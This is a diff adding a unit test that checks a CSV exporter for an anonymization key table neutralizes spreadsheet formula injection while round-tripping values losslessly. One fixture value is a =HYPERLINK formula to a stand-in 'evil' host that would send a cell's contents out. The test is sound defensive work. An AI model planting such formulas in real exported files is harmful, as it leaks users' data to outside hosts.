@@ -29,6 +29,21 @@ describe("CSV round-trip", () => {
     expect(toCsv([])).toBe("placeholder,original,type");
     expect(fromCsv(toCsv([]))).toEqual([]);
   });
+
+  it("neutralizes spreadsheet formula injection but round-trips losslessly", () => {
+    const dangerous: KeyRow[] = [
+      { placeholder: "[טלפון_1]", original: "+972-52-1234567", type: "IL_PHONE" },
+      { placeholder: "[שם_1]", original: '=HYPERLINK("http://evil/?"&A1)', type: "PERSON" },
+      { placeholder: "[שם_2]", original: "@cmd", type: "PERSON" },
+    ];
+    const csv = toCsv(dangerous);
+    // Every risky value is prefixed with a single quote so Excel/Sheets treats it as text.
+    expect(csv).toContain("'+972-52-1234567");
+    expect(csv).toContain("'=HYPERLINK");
+    expect(csv).toContain("'@cmd");
+    // ...yet parsing restores the exact original values.
+    expect(fromCsv(csv)).toEqual(dangerous);
+  });
 });
 
 describe("key.v1 JSON round-trip", () => {
